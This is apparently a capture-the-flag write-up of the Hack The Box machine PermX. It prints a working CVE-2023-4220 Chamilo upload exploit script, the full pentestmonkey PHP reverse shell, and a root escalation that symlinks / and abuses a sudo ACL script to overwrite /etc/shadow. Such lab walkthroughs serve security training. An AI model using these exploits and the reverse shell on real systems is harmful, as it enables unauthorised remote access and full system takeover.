---
description: Linux 🔮 Easy
cover: https://i.pinimg.com/564x/e0/f3/f4/e0f3f48e396e8e0562a088f03e823d91.jpg
coverY: 0
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# PermX

## Recon

### Nmap

```
Nmap scan report for permx.htb (10.10.11.23)
Host is up (0.31s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: eLEARNING
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.88 seconds

```

The nmap results are nothing special, just normal ports 80 and 22

## Web app

<figure><img src="../../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

Overall, this could be a website providing online courses

Let's check some hidden directories

<figure><img src="../../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

I have scanned all of that directory but nothing interesting so I continue to scan for vHost

<figure><img src="../../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

We can see there are <mark style="color:red;">**`www`**</mark> and <mark style="color:red;">**`lms`**</mark>. The <mark style="color:red;">**`www`**</mark>one is the site we visited the first time, so let's navigate to <mark style="color:red;">**`http://lms.permx.htb`**</mark> to see what is in there

<figure><img src="../../../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

There is a login page, I have tried some basic credentials such as <mark style="color:red;">**`admin:admin`**</mark> but it's wrong

{% hint style="info" %}
<mark style="color:red;">**`Chamilo`**</mark> is a free software (under GNU/GPL licensing) e-learning and content management system, aimed at improving access to education and knowledge globally. It is backed up by the Chamilo Association, which has goals including the promotion of the software, the maintenance of a clear communication channel, and the building of a network of service providers and software contributors.
{% endhint %}

I continue to scan this vHost directory and sensitive files to enumerate more information:

<figure><img src="../../../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

Once we navigate to <mark style="color:red;">**`/robots.txt`**</mark> we can see which directory the site has disallow:

<figure><img src="../../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

Attempt to access<mark style="color:red;">**`/documentation`**</mark> we can see the Chamilo LMS version

<figure><img src="../../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

I tried to google it and realized that that version had an error that could help us with RCE. It is <mark style="color:red;">**`CVE-2023-4220`**</mark>. You can read more information[ **here**](https://starlabs.sg/advisories/23/23-4220/)

Besides, I tried going to <mark style="color:red;">**`/app`**</mark>  to see its config section hoping it could give me the user's password but I didn't get anything.

<figure><img src="../../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

## CVE-2023-4220

Based on this article I can upload revshell to the website easily

I use an exploit developed by [Ziad-Sakr](https://github.com/Ziad-Sakr/Chamilo-CVE-2023-4220-Exploit)

```bash
# Usage:  ./CVE-2023-4220.sh -f reveres_file -h host_link -p port_in_the_reverse_file

#!/bin/bash

# Initialize variables with default values
reverse_file=""
host_link=""
port=""

#------------------------------------------------

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'


# Usage function to display script usage
usage() {
    echo -e "${GREEN}"
    echo "Usage: $0 -f reverse_file -h host_link -p port_in_the_reverse_file"
    echo -e "${NC}"
    echo "Options:"
    echo "  -f    Path to the reverse file"
    echo "  -h    Host link where the file will be uploaded"
    echo "  -p    Port for the reverse shell"
    exit 1
}

# Parse command-line options
while getopts "f:h:p:" opt; do
    case $opt in
        f)
            reverse_file=$OPTARG
            ;;
        h)
            host_link=$OPTARG
            ;;
        p)
            port=$OPTARG
            ;;
        \?)
            echo -e "${RED}"
            echo "Invalid option: -$OPTARG" >&2
            usage
            ;;
        :)
	    echo -e "${RED}"
            echo "Option -$OPTARG requires an argument." >&2
            usage
            ;;
    esac
done

# Check if all required options are provided
if [ -z "$reverse_file" ] || [ -z "$host_link" ] || [ -z "$port" ]; then
    echo -e  "${RED}"
    echo "All options -f, -h, and -p are required."
    usage
fi
# Perform the file upload using curl
echo -e "${GREEN}" 
curl -F "bigUploadFile=@$reverse_file" "$host_link/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"
echo
echo
echo -e "#    Use This leter For Interactive TTY ;) " "${RED}"
echo "#    python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
echo "#    export TERM=xterm"
echo "#    CTRL + Z"
echo "#    stty raw -echo; fg"
echo -e "${GREEN}"
echo "# Starting Reverse Shell On Port $port . . . . . . ."
sleep 3
curl "$host_link/main/inc/lib/javascript/bigupload/files/$reverse_file" &
echo -e  "${NC}"

nc -lnvp $port 
```

And my shell is:&#x20;

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

```

Execute the script:

```bash
./CVE-2023-4220.sh -f /home/alter/Desktop/HTB/permX/shell.php -h http://lms.permx.htb/ -p  4444
```

Navigate to <mark style="color:red;">**`http://lms.permx/main/inc/lib/javascript/bigupload/files/`**</mark> and open the shell

<figure><img src="../../../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

When I access <mark style="color:red;">**`www-data`**</mark>, I immediately go to the config folder to see what's in there, because we can't access it normally with a browser.

<figure><img src="../../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

So we have the user's password. Also, check <mark style="color:red;">**`/home`**</mark> we know it's <mark style="color:red;">**`mtz`**</mark> 's password

SSH to <mark style="color:red;">**`mtz`**</mark> and we get the flag:&#x20;

<figure><img src="../../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

## Root&#x20;

Check the sudo privilege, we have it for <mark style="color:red;">**`acl.sh`**</mark>, which indicates some access control lists (ACLs) management, like the name of the box:

<figure><img src="../../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

```bash
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

Let's analyze it a bit:

* The script first checks if exactly three arguments are provided (<mark style="color:red;">**`user`**</mark>, <mark style="color:red;">**`perm`**</mark>, <mark style="color:red;">**`file`**</mark>). If not, it prints a usage message and exits with status code 1.
* The target file is located within the <mark style="color:red;">**`/home/mtz/`**</mark> directory and it does not contain any <mark style="color:red;">**`..`**</mark> sequences (which could be used to traverse directories and access files outside the intended directory).
* If the <mark style="color:red;">**`target`**</mark> does not meet these conditions, the script prints "Access denied." and exits.
* The target must be a file.
* Finally, the script uses the <mark style="color:red;">**`setfacl`**</mark> command to modify the ACL for the file, granting the specified permissions (<mark style="color:red;">**`perm`**</mark>) to the specified user (<mark style="color:red;">**`user`**</mark>). The command is executed with <mark style="color:red;">**`sudo`**</mark> to ensure it has the necessary permissions to modify the ACLs.

{% hint style="info" %}
<mark style="color:red;">**`setfacl`**</mark> is a command in the Linux operating system used to set access control lists (ACL - Access Control Lists) for files and directories. ACLs give you more granular control over access permissions than traditional permissions (read, write, execute) on files and folders, by allowing permissions to be assigned to different users and groups, instead of only owners, groups, and other users.
{% endhint %}

Based on that logic we can do it this way

First, we use the tool called ln to symlink pointing to the / root path of the Linux system, within the restricted path <mark style="color:red;">**`/home/mtz`**</mark>, named root:

```sh
ln -s / root
```

Next, run the <mark style="color:red;">**`/opt/acl.sh`**</mark>:

```bash
sudo /opt/acl.sh mtz rwx /home/mtz/root/etc/shadow
```

Since we are adjusting the ACL for the individual user <mark style="color:red;">**`mtz`**</mark>, we won't observe an immediate effect on the target file. However, we can already notice that the ACL on <mark style="color:red;">**`/etc/shadow`**</mark> has been altered to grant <mark style="color:red;">**`rwx`**</mark> privileges to users in the 'shadow' group, whereas it previously had only <mark style="color:red;">**`r`**</mark> privileges.

Next is to create a hash code for the password:

<figure><img src="../../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

And finally, overwrite the <mark style="color:red;">**`/etc/shadow`**</mark> file:&#x20;

```bash
echo 'root:$6$syblHEjUxaNofuDh$Nk3I2qHce9S6jpSEJzhd0JMp9pkus8qbPd.GJue9AZNXrP38vWvOA3Ks9VQ2DsexapZC9dsdpvdH2oal3FRL00:19305::::::' > /etc/shadow
```

Use <mark style="color:red;">**`su root`**</mark> and enter the password we have created by OpenSSL to <mark style="color:red;">**`root`**</mark>

<figure><img src="../../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>
